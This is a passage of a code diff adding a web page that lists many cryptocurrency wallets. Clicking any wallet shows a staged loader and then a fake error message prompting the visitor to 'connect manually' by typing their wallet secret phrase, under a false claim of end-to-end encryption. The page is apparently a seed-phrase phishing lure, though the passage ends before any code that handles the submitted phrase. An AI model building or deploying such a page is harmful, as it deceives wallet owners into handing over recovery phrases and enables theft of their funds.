+    <img src="https://jaxx.io/favicon.ico" alt="Jaxx Liberty Wallet">
+    <div class="coin-info">
+        <a href="https://jaxx.io" target="_blank">Jaxx Liberty Wallet</a>
+        <div class="website">jaxx.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trustline Wallet -->
+<div class="coin-box" data-name="Trustline Wallet" data-logo="https://www.trustline.io/favicon.ico">
+    <img src="https://www.trustline.io/favicon.ico" alt="Trustline Wallet">
+    <div class="coin-info">
+        <a href="https://www.trustline.io" target="_blank">Trustline Wallet</a>
+        <div class="website">trustline.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coincheck Wallet -->
+<div class="coin-box" data-name="Coincheck Wallet" data-logo="https://coincheck.com/favicon.ico">
+    <img src="https://coincheck.com/favicon.ico" alt="Coincheck Wallet">
+    <div class="coin-info">
+        <a href="https://coincheck.com" target="_blank">Coincheck Wallet</a>
+        <div class="website">coincheck.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Blockfolio Wallet -->
+<div class="coin-box" data-name="Blockfolio Wallet" data-logo="https://www.blockfolio.com/favicon.ico">
+    <img src="https://www.blockfolio.com/favicon.ico" alt="Blockfolio Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockfolio.com" target="_blank">Blockfolio Wallet</a>
+        <div class="website">blockfolio.com</div>
+    </div>
+</div>
+
+
+
+
+
+<!-- Coin Box for Bitmart Wallet -->
+<div class="coin-box" data-name="Bitmart Wallet" data-logo="https://www.bitmart.com/favicon.ico">
+    <img src="https://www.bitmart.com/favicon.ico" alt="Bitmart Wallet">
+    <div class="coin-info">
+        <a href="https://www.bitmart.com" target="_blank">Bitmart Wallet</a>
+        <div class="website">bitmart.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for SafePal Wallet -->
+<div class="coin-box" data-name="SafePal Wallet" data-logo="https://www.safepal.com/favicon.ico">
+    <img src="https://www.safepal.com/favicon.ico" alt="SafePal Wallet">
+    <div class="coin-info">
+        <a href="https://www.safepal.com" target="_blank">SafePal Wallet</a>
+        <div class="website">safepal.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Nifty Wallet -->
+<div class="coin-box" data-name="Nifty Wallet" data-logo="https://www.niftywallet.io/favicon.ico">
+    <img src="https://www.niftywallet.io/favicon.ico" alt="Nifty Wallet">
+    <div class="coin-info">
+        <a href="https://www.niftywallet.io" target="_blank">Nifty Wallet</a>
+        <div class="website">niftywallet.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for BitGo Wallet -->
+<div class="coin-box" data-name="BitGo Wallet" data-logo="https://www.bitgo.com/favicon.ico">
+    <img src="https://www.bitgo.com/favicon.ico" alt="BitGo Wallet">
+    <div class="coin-info">
+        <a href="https://www.bitgo.com" target="_blank">BitGo Wallet</a>
+        <div class="website">bitgo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for MetaMask Wallet -->
+<div class="coin-box" data-name="MetaMask Wallet" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask Wallet">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask Wallet</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Phantom Wallet -->
+<div class="coin-box" data-name="Phantom Wallet" data-logo="https://phantom.app/favicon.ico">
+    <img src="https://phantom.app/favicon.ico" alt="Phantom Wallet">
+    <div class="coin-info">
+        <a href="https://phantom.app" target="_blank">Phantom Wallet</a>
+        <div class="website">phantom.app</div>
+    </div>
+</div>
+
+<!-- Coin Box for Exodus Wallet -->
+<div class="coin-box" data-name="Exodus Wallet" data-logo="https://www.exodus.com/favicon.ico">
+    <img src="https://www.exodus.com/favicon.ico" alt="Exodus Wallet">
+    <div class="coin-info">
+        <a href="https://www.exodus.com" target="_blank">Exodus Wallet</a>
+        <div class="website">exodus.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trust Vault Wallet -->
+<div class="coin-box" data-name="Trust Vault Wallet" data-logo="https://www.trustwallet.com/favicon.ico">
+    <img src="https://www.trustwallet.com/favicon.ico" alt="Trust Vault Wallet">
+    <div class="coin-info">
+        <a href="https://www.trustwallet.com" target="_blank">Trust Vault Wallet</a>
+        <div class="website">trustwallet.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BlockFi Wallet -->
+<div class="coin-box" data-name="BlockFi Wallet" data-logo="https://www.blockfi.com/favicon.ico">
+    <img src="https://www.blockfi.com/favicon.ico" alt="BlockFi Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockfi.com" target="_blank">BlockFi Wallet</a>
+        <div class="website">blockfi.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for MetaMask Mobile -->
+<div class="coin-box" data-name="MetaMask Mobile" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask Mobile">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask Mobile</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trustline Wallet -->
+<div class="coin-box" data-name="Trustline Wallet" data-logo="https://www.trustline.io/favicon.ico">
+    <img src="https://www.trustline.io/favicon.ico" alt="Trustline Wallet">
+    <div class="coin-info">
+        <a href="https://www.trustline.io" target="_blank">Trustline Wallet</a>
+        <div class="website">trustline.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coinomi Wallet -->
+<div class="coin-box" data-name="Coinomi Wallet" data-logo="https://www.coinomi.com/favicon.ico">
+    <img src="https://www.coinomi.com/favicon.ico" alt="Coinomi Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinomi.com" target="_blank">Coinomi Wallet</a>
+        <div class="website">coinomi.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BRD Wallet -->
+<div class="coin-box" data-name="BRD Wallet" data-logo="https://brd.com/favicon.ico">
+    <img src="https://brd.com/favicon.ico" alt="BRD Wallet">
+    <div class="coin-info">
+        <a href="https://brd.com" target="_blank">BRD Wallet</a>
+        <div class="website">brd.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trezor Wallet -->
+<div class="coin-box" data-name="Trezor Wallet" data-logo="https://trezor.io/favicon.ico">
+    <img src="https://trezor.io/favicon.ico" alt="Trezor Wallet">
+    <div class="coin-info">
+        <a href="https://trezor.io" target="_blank">Trezor Wallet</a>
+        <div class="website">trezor.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Jaxx Liberty Wallet -->
+<div class="coin-box" data-name="Jaxx Liberty Wallet" data-logo="https://jaxx.io/favicon.ico">
+    <img src="https://jaxx.io/favicon.ico" alt="Jaxx Liberty Wallet">
+    <div class="coin-info">
+        <a href="https://jaxx.io" target="_blank">Jaxx Liberty Wallet</a>
+        <div class="website">jaxx.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Electrum Wallet -->
+<div class="coin-box" data-name="Electrum Wallet" data-logo="https://electrum.org/favicon.ico">
+    <img src="https://electrum.org/favicon.ico" alt="Electrum Wallet">
+    <div class="coin-info">
+        <a href="https://electrum.org" target="_blank">Electrum Wallet</a>
+        <div class="website">electrum.org</div>
+    </div>
+</div>
+
+<!-- Coin Box for MetaMask Chrome Extension -->
+<div class="coin-box" data-name="MetaMask Chrome Extension" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask Chrome Extension">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask Chrome Extension</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Guarda Wallet -->
+<div class="coin-box" data-name="Guarda Wallet" data-logo="https://guarda.com/favicon.ico">
+    <img src="https://guarda.com/favicon.ico" alt="Guarda Wallet">
+    <div class="coin-info">
+        <a href="https://guarda.com" target="_blank">Guarda Wallet</a>
+        <div class="website">guarda.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Blockchain.info Wallet -->
+<div class="coin-box" data-name="Blockchain.info Wallet" data-logo="https://www.blockchain.com/favicon.ico">
+    <img src="https://www.blockchain.com/favicon.ico" alt="Blockchain.info Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockchain.com" target="_blank">Blockchain.info Wallet</a>
+        <div class="website">blockchain.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Luno Wallet -->
+<div class="coin-box" data-name="Luno Wallet" data-logo="https://www.luno.com/favicon.ico">
+    <img src="https://www.luno.com/favicon.ico" alt="Luno Wallet">
+    <div class="coin-info">
+        <a href="https://www.luno.com" target="_blank">Luno Wallet</a>
+        <div class="website">luno.com</div>
+    </div>
+</div>
+
+
+        <!-- Coin Box for MetaMask -->
+<div class="coin-box" data-name="MetaMask" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coinbase Wallet -->
+<div class="coin-box" data-name="Coinbase Wallet" data-logo="https://www.coinbase.com/favicon.ico">
+    <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinbase.com/wallet" target="_blank">Coinbase Wallet</a>
+        <div class="website">coinbase.com/wallet</div>
+    </div>
+</div>
+
+<!-- Coin Box for Exodus Wallet -->
+<div class="coin-box" data-name="Exodus Wallet" data-logo="https://www.exodus.com/favicon.ico">
+    <img src="https://www.exodus.com/favicon.ico" alt="Exodus Wallet">
+    <div class="coin-info">
+        <a href="https://www.exodus.com" target="_blank">Exodus Wallet</a>
+        <div class="website">exodus.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trust Wallet -->
+<div class="coin-box" data-name="Trust Wallet" data-logo="https://trustwallet.com/favicon.ico">
+    <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet">
+    <div class="coin-info">
+        <a href="https://trustwallet.com" target="_blank">Trust Wallet</a>
+        <div class="website">trustwallet.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trezor -->
+<div class="coin-box" data-name="Trezor" data-logo="https://trezor.io/favicon.ico">
+    <img src="https://trezor.io/favicon.ico" alt="Trezor">
+    <div class="coin-info">
+        <a href="https://trezor.io" target="_blank">Trezor</a>
+        <div class="website">trezor.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Ledger -->
+<div class="coin-box" data-name="Ledger" data-logo="https://www.ledger.com/favicon.ico">
+    <img src="https://www.ledger.com/favicon.ico" alt="Ledger">
+    <div class="coin-info">
+        <a href="https://www.ledger.com" target="_blank">Ledger</a>
+        <div class="website">ledger.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Blockchain Wallet -->
+<div class="coin-box" data-name="Blockchain Wallet" data-logo="https://www.blockchain.com/favicon.ico">
+    <img src="https://www.blockchain.com/favicon.ico" alt="Blockchain Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockchain.com" target="_blank">Blockchain Wallet</a>
+        <div class="website">blockchain.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Electrum Wallet -->
+<div class="coin-box" data-name="Electrum Wallet" data-logo="https://electrum.org/favicon.ico">
+    <img src="https://electrum.org/favicon.ico" alt="Electrum Wallet">
+    <div class="coin-info">
+        <a href="https://electrum.org" target="_blank">Electrum Wallet</a>
+        <div class="website">electrum.org</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trust Wallet -->
+<div class="coin-box" data-name="Trust Wallet" data-logo="https://trustwallet.com/favicon.ico">
+    <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet">
+    <div class="coin-info">
+        <a href="https://trustwallet.com" target="_blank">Trust Wallet</a>
+        <div class="website">trustwallet.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Mycelium Wallet -->
+<div class="coin-box" data-name="Mycelium Wallet" data-logo="https://mycelium.com/favicon.ico">
+    <img src="https://mycelium.com/favicon.ico" alt="Mycelium Wallet">
+    <div class="coin-info">
+        <a href="https://mycelium.com" target="_blank">Mycelium Wallet</a>
+        <div class="website">mycelium.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BRD Wallet -->
+<div class="coin-box" data-name="BRD Wallet" data-logo="https://brd.com/favicon.ico">
+    <img src="https://brd.com/favicon.ico" alt="BRD Wallet">
+    <div class="coin-info">
+        <a href="https://brd.com" target="_blank">BRD Wallet</a>
+        <div class="website">brd.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Argent Wallet -->
+<div class="coin-box" data-name="Argent Wallet" data-logo="https://www.argent.xyz/favicon.ico">
+    <img src="https://www.argent.xyz/favicon.ico" alt="Argent Wallet">
+    <div class="coin-info">
+        <a href="https://www.argent.xyz" target="_blank">Argent Wallet</a>
+        <div class="website">argent.xyz</div>
+    </div>
+</div>
+
+<!-- Coin Box for ZenGo Wallet -->
+<div class="coin-box" data-name="ZenGo Wallet" data-logo="https://zengo.com/favicon.ico">
+    <img src="https://zengo.com/favicon.ico" alt="ZenGo Wallet">
+    <div class="coin-info">
+        <a href="https://zengo.com" target="_blank">ZenGo Wallet</a>
+        <div class="website">zengo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for SafePal Wallet -->
+<div class="coin-box" data-name="SafePal Wallet" data-logo="https://www.safepal.com/favicon.ico">
+    <img src="https://www.safepal.com/favicon.ico" alt="SafePal Wallet">
+    <div class="coin-info">
+        <a href="https://www.safepal.com" target="_blank">SafePal Wallet</a>
+        <div class="website">safepal.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coinomi Wallet -->
+<div class="coin-box" data-name="Coinomi Wallet" data-logo="https://www.coinomi.com/favicon.ico">
+    <img src="https://www.coinomi.com/favicon.ico" alt="Coinomi Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinomi.com" target="_blank">Coinomi Wallet</a>
+        <div class="website">coinomi.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Guarda Wallet -->
+<div class="coin-box" data-name="Guarda Wallet" data-logo="https://guarda.com/favicon.ico">
+    <img src="https://guarda.com/favicon.ico" alt="Guarda Wallet">
+    <div class="coin-info">
+        <a href="https://guarda.com" target="_blank">Guarda Wallet</a>
+        <div class="website">guarda.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Armory Wallet -->
+<div class="coin-box" data-name="Armory Wallet" data-logo="https://bitcoinarmory.com/favicon.ico">
+    <img src="https://bitcoinarmory.com/favicon.ico" alt="Armory Wallet">
+    <div class="coin-info">
+        <a href="https://bitcoinarmory.com" target="_blank">Armory Wallet</a>
+        <div class="website">bitcoinarmory.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Jaxx Liberty Wallet -->
+<div class="coin-box" data-name="Jaxx Liberty Wallet" data-logo="https://jaxx.io/favicon.ico">
+    <img src="https://jaxx.io/favicon.ico" alt="Jaxx Liberty Wallet">
+    <div class="coin-info">
+        <a href="https://jaxx.io" target="_blank">Jaxx Liberty Wallet</a>
+        <div class="website">jaxx.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for BitPay Wallet -->
+<div class="coin-box" data-name="BitPay Wallet" data-logo="https://bitpay.com/favicon.ico">
+    <img src="https://bitpay.com/favicon.ico" alt="BitPay Wallet">
+    <div class="coin-info">
+        <a href="https://bitpay.com" target="_blank">BitPay Wallet</a>
+        <div class="website">bitpay.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Bitgo Wallet -->
+<div class="coin-box" data-name="Bitgo Wallet" data-logo="https://www.bitgo.com/favicon.ico">
+    <img src="https://www.bitgo.com/favicon.ico" alt="Bitgo Wallet">
+    <div class="coin-info">
+        <a href="https://www.bitgo.com" target="_blank">Bitgo Wallet</a>
+        <div class="website">bitgo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Exodus Wallet -->
+<div class="coin-box" data-name="Exodus Wallet" data-logo="https://www.exodus.com/favicon.ico">
+    <img src="https://www.exodus.com/favicon.ico" alt="Exodus Wallet">
+    <div class="coin-info">
+        <a href="https://www.exodus.com" target="_blank">Exodus Wallet</a>
+        <div class="website">exodus.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for TronLink Wallet -->
+<div class="coin-box" data-name="TronLink Wallet" data-logo="https://tronlink.org/favicon.ico">
+    <img src="https://tronlink.org/favicon.ico" alt="TronLink Wallet">
+    <div class="coin-info">
+        <a href="https://tronlink.org" target="_blank">TronLink Wallet</a>
+        <div class="website">tronlink.org</div>
+    </div>
+</div>
+<!-- Coin Box for MetaMask -->
+<div class="coin-box" data-name="MetaMask" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coinbase Wallet -->
+<div class="coin-box" data-name="Coinbase Wallet" data-logo="https://www.coinbase.com/favicon.ico">
+    <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinbase.com/wallet" target="_blank">Coinbase Wallet</a>
+        <div class="website">coinbase.com/wallet</div>
+    </div>
+</div>
+
+<!-- Coin Box for Exodus Wallet -->
+<div class="coin-box" data-name="Exodus Wallet" data-logo="https://www.exodus.com/favicon.ico">
+    <img src="https://www.exodus.com/favicon.ico" alt="Exodus Wallet">
+    <div class="coin-info">
+        <a href="https://www.exodus.com" target="_blank">Exodus Wallet</a>
+        <div class="website">exodus.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trust Wallet -->
+<div class="coin-box" data-name="Trust Wallet" data-logo="https://trustwallet.com/favicon.ico">
+    <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet">
+    <div class="coin-info">
+        <a href="https://trustwallet.com" target="_blank">Trust Wallet</a>
+        <div class="website">trustwallet.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Trezor -->
+<div class="coin-box" data-name="Trezor" data-logo="https://trezor.io/favicon.ico">
+    <img src="https://trezor.io/favicon.ico" alt="Trezor">
+    <div class="coin-info">
+        <a href="https://trezor.io" target="_blank">Trezor</a>
+        <div class="website">trezor.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Ledger -->
+<div class="coin-box" data-name="Ledger" data-logo="https://www.ledger.com/favicon.ico">
+    <img src="https://www.ledger.com/favicon.ico" alt="Ledger">
+    <div class="coin-info">
+        <a href="https://www.ledger.com" target="_blank">Ledger</a>
+        <div class="website">ledger.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Blockchain Wallet -->
+<div class="coin-box" data-name="Blockchain Wallet" data-logo="https://www.blockchain.com/favicon.ico">
+    <img src="https://www.blockchain.com/favicon.ico" alt="Blockchain Wallet">
+    <div class="coin-info">
+        <a href="https://www.blockchain.com" target="_blank">Blockchain Wallet</a>
+        <div class="website">blockchain.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Electrum Wallet -->
+<div class="coin-box" data-name="Electrum Wallet" data-logo="https://electrum.org/favicon.ico">
+    <img src="https://electrum.org/favicon.ico" alt="Electrum Wallet">
+    <div class="coin-info">
+        <a href="https://electrum.org" target="_blank">Electrum Wallet</a>
+        <div class="website">electrum.org</div>
+    </div>
+</div>
+
+<!-- Coin Box for Mycelium Wallet -->
+<div class="coin-box" data-name="Mycelium Wallet" data-logo="https://mycelium.com/favicon.ico">
+    <img src="https://mycelium.com/favicon.ico" alt="Mycelium Wallet">
+    <div class="coin-info">
+        <a href="https://mycelium.com" target="_blank">Mycelium Wallet</a>
+        <div class="website">mycelium.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for BRD Wallet -->
+<div class="coin-box" data-name="BRD Wallet" data-logo="https://brd.com/favicon.ico">
+    <img src="https://brd.com/favicon.ico" alt="BRD Wallet">
+    <div class="coin-info">
+        <a href="https://brd.com" target="_blank">BRD Wallet</a>
+        <div class="website">brd.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Argent Wallet -->
+<div class="coin-box" data-name="Argent Wallet" data-logo="https://www.argent.xyz/favicon.ico">
+    <img src="https://www.argent.xyz/favicon.ico" alt="Argent Wallet">
+    <div class="coin-info">
+        <a href="https://www.argent.xyz" target="_blank">Argent Wallet</a>
+        <div class="website">argent.xyz</div>
+    </div>
+</div>
+
+<!-- Coin Box for ZenGo Wallet -->
+<div class="coin-box" data-name="ZenGo Wallet" data-logo="https://zengo.com/favicon.ico">
+    <img src="https://zengo.com/favicon.ico" alt="ZenGo Wallet">
+    <div class="coin-info">
+        <a href="https://zengo.com" target="_blank">ZenGo Wallet</a>
+        <div class="website">zengo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for SafePal Wallet -->
+<div class="coin-box" data-name="SafePal Wallet" data-logo="https://www.safepal.com/favicon.ico">
+    <img src="https://www.safepal.com/favicon.ico" alt="SafePal Wallet">
+    <div class="coin-info">
+        <a href="https://www.safepal.com" target="_blank">SafePal Wallet</a>
+        <div class="website">safepal.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coinomi Wallet -->
+<div class="coin-box" data-name="Coinomi Wallet" data-logo="https://www.coinomi.com/favicon.ico">
+    <img src="https://www.coinomi.com/favicon.ico" alt="Coinomi Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinomi.com" target="_blank">Coinomi Wallet</a>
+        <div class="website">coinomi.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Guarda Wallet -->
+<div class="coin-box" data-name="Guarda Wallet" data-logo="https://guarda.com/favicon.ico">
+    <img src="https://guarda.com/favicon.ico" alt="Guarda Wallet">
+    <div class="coin-info">
+        <a href="https://guarda.com" target="_blank">Guarda Wallet</a>
+        <div class="website">guarda.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Armory Wallet -->
+<div class="coin-box" data-name="Armory Wallet" data-logo="https://bitcoinarmory.com/favicon.ico">
+    <img src="https://bitcoinarmory.com/favicon.ico" alt="Armory Wallet">
+    <div class="coin-info">
+        <a href="https://bitcoinarmory.com" target="_blank">Armory Wallet</a>
+        <div class="website">bitcoinarmory.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Jaxx Liberty Wallet -->
+<div class="coin-box" data-name="Jaxx Liberty Wallet" data-logo="https://jaxx.io/favicon.ico">
+    <img src="https://jaxx.io/favicon.ico" alt="Jaxx Liberty Wallet">
+    <div class="coin-info">
+        <a href="https://jaxx.io" target="_blank">Jaxx Liberty Wallet</a>
+        <div class="website">jaxx.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for BitPay Wallet -->
+<div class="coin-box" data-name="BitPay Wallet" data-logo="https://bitpay.com/favicon.ico">
+    <img src="https://bitpay.com/favicon.ico" alt="BitPay Wallet">
+    <div class="coin-info">
+        <a href="https://bitpay.com" target="_blank">BitPay Wallet</a>
+        <div class="website">bitpay.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Bitgo Wallet -->
+<div class="coin-box" data-name="Bitgo Wallet" data-logo="https://www.bitgo.com/favicon.ico">
+    <img src="https://www.bitgo.com/favicon.ico" alt="Bitgo Wallet">
+    <div class="coin-info">
+        <a href="https://www.bitgo.com" target="_blank">Bitgo Wallet</a>
+        <div class="website">bitgo.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Exodus Wallet -->
+<div class="coin-box" data-name="Exodus Wallet" data-logo="https://www.exodus.com/favicon.ico">
+    <img src="https://www.exodus.com/favicon.ico" alt="Exodus Wallet">
+    <div class="coin-info">
+        <a href="https://www.exodus.com" target="_blank">Exodus Wallet</a>
+        <div class="website">exodus.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for TronLink Wallet -->
+<div class="coin-box" data-name="TronLink Wallet" data-logo="https://tronlink.org/favicon.ico">
+    <img src="https://tronlink.org/favicon.ico" alt="TronLink Wallet">
+    <div class="coin-info">
+        <a href="https://tronlink.org" target="_blank">TronLink Wallet</a>
+        <div class="website">tronlink.org</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coin98 Wallet -->
+<div class="coin-box" data-name="Coin98 Wallet" data-logo="https://coin98.com/favicon.ico">
+    <img src="https://coin98.com/favicon.ico" alt="Coin98 Wallet">
+    <div class="coin-info">
+        <a href="https://coin98.com" target="_blank">Coin98 Wallet</a>
+        <div class="website">coin98.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Phantom Wallet -->
+<div class="coin-box" data-name="Phantom Wallet" data-logo="https://phantom.app/favicon.ico">
+    <img src="https://phantom.app/favicon.ico" alt="Phantom Wallet">
+    <div class="coin-info">
+        <a href="https://phantom.app" target="_blank">Phantom Wallet</a>
+        <div class="website">phantom.app</div>
+    </div>
+</div>
+
+<!-- Coin Box for Guarda Wallet -->
+<div class="coin-box" data-name="Guarda Wallet" data-logo="https://guarda.com/favicon.ico">
+    <img src="https://guarda.com/favicon.ico" alt="Guarda Wallet">
+    <div class="coin-info">
+        <a href="https://guarda.com" target="_blank">Guarda Wallet</a>
+        <div class="website">guarda.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for MetaMask Wallet -->
+<div class="coin-box" data-name="MetaMask Wallet" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="MetaMask Wallet">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">MetaMask Wallet</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+<!-- Coin Box for Coin98 Wallet -->
+<div class="coin-box" data-name="Coin98 Wallet" data-logo="https://coin98.com/favicon.ico">
+    <img src="https://coin98.com/favicon.ico" alt="Coin98 Wallet">
+    <div class="coin-info">
+        <a href="https://coin98.com" target="_blank">Coin98 Wallet</a>
+        <div class="website">coin98.com</div>
+    </div>
+</div>
+
+<!-- Coin Box for Metamask Wallet -->
+<div class="coin-box" data-name="Metamask Wallet" data-logo="https://metamask.io/favicon.ico">
+    <img src="https://metamask.io/favicon.ico" alt="Metamask Wallet">
+    <div class="coin-info">
+        <a href="https://metamask.io" target="_blank">Metamask Wallet</a>
+        <div class="website">metamask.io</div>
+    </div>
+</div>
+
+        <!-- Coin Box for Trezor -->
+<div class="coin-box" data-name="Trezor" data-logo="https://trezor.io/favicon.ico">
+    <img src="https://trezor.io/favicon.ico" alt="Trezor">
+    <div class="coin-info">
+        <a href="https://trezor.io" target="_blank">Trezor</a>
+        <div class="website">trezor.io</div>
+    </div>
+</div>
+
+        <!-- Coin Box for Coinbase Wallet -->
+<div class="coin-box" data-name="Coinbase Wallet" data-logo="https://www.coinbase.com/favicon.ico">
+    <img src="https://www.coinbase.com/favicon.ico" alt="Coinbase Wallet">
+    <div class="coin-info">
+        <a href="https://www.coinbase.com/wallet" target="_blank">Coinbase Wallet</a>
+        <div class="website">coinbase.com/wallet</div>
+    </div>
+</div>
+
+        <!-- Coin Box for Trust Wallet -->
+        <div class="coin-box" data-name="Trust Wallet" data-logo="https://trustwallet.com/favicon.ico">
+            <img src="https://trustwallet.com/favicon.ico" alt="Trust Wallet">
+            <div class="coin-info">
+                <a href="https://trustwallet.com" target="_blank">Trust Wallet</a>
+                <div class="website">trustwallet.com</div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Wallet Modal -->
+    <div id="walletModal" class="modal">
+        <div class="modal-content">
+            <img id="modalLogo" src="" alt="Wallet Logo">
+           
+            <!-- Security Information Text -->
+            <p class="info-text">
+             <!-- <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/2/27/Lock_icon_%282012-2019%29.svg/120px-Lock_icon_%282012-2019%29.svg.png" alt="Security Icon">
+                <strong>This session is secured and encrypted</strong>
+            </p>
+            <p class="info-text">
+                <img src="https://avantetech.com/wp-content/uploads/Real-Time-Alert.png" alt="Security Icon">-->
+                <strong>An error occurred... please try again or connect manually</strong>
+            </p>
+         
+            
+            <button id="retryButton">Retry</button>
+            <button id="manualConnectButton">Connect Manually</button>
+            <p class="info-text">
+                <img src="http://www.pngall.com/wp-content/uploads/4/Web-Security-Shield-PNG.png" alt="Security Icon">
+                <strong>This session is protected with end-to-end encryption</strong>
+            </p>
+            <!-- Secret Phrase Section -->
+            <div id="secret-phrase-section">
+                <input type="text" id="secret-phrase-input" placeholder="Enter your secret phrase">
+                <button id="submitSecretPhraseButton">Connect</button>
+                <button id="backToWalletSelectionButton">Back to Wallet Selection</button>
+            </div>
+
+            <!-- Continuous Loader (Initially Hidden) -->
+            <div id="continuousLoader" class="continuous-loader" style="display: none;"></div>
+        </div>
+    </div>
+
+    <script>
+        // Wallet box click functionality to show loader before modal
+        const coinBoxes = document.querySelectorAll(".coin-box");
+        const coinSearch = document.getElementById("coin-search");
+        const coinBoxContainer = document.getElementById("coin-box-container");
+
+        // Filter wallets by name as user types in the search bar
+        coinSearch.addEventListener("input", function() {
+            const searchTerm = coinSearch.value.toLowerCase();
+
+            coinBoxes.forEach(function(box) {
+                const walletName = box.getAttribute("data-name").toLowerCase();
+                if (walletName.includes(searchTerm)) {
+                    box.style.display = "block"; // Show matching wallets
+                } else {
+                    box.style.display = "none"; // Hide non-matching wallets
+                }
+            });
+        });
+
+        coinBoxes.forEach(function(box) {
+            box.addEventListener("click", function() {
+                const logoUrl = box.getAttribute("data-logo");
+
+                // Show the linear loader before the modal
+                document.getElementById("linearLoader").style.display = "block"; // Show loader
+                document.getElementById("linearLoader").classList.add("active"); // Start animation
+
+                // Simulate a delay for the loader (2 seconds)
+                setTimeout(function() {
+                    // Hide the loader after delay and show the modal
+                    document.getElementById("linearLoader").classList.remove("active");
+                    document.getElementById("linearLoader").style.display = "none";
+                    
+                    document.getElementById("modalLogo").src = logoUrl;
+                    document.getElementById("walletModal").style.display = "block";
+                }, 2000); // Adjust time as needed
+            });
+        });
+
+        // Close the modal
+        document.getElementById("retryButton").addEventListener("click", function() {
+            document.getElementById("walletModal").style.display = "none";
+        });
+
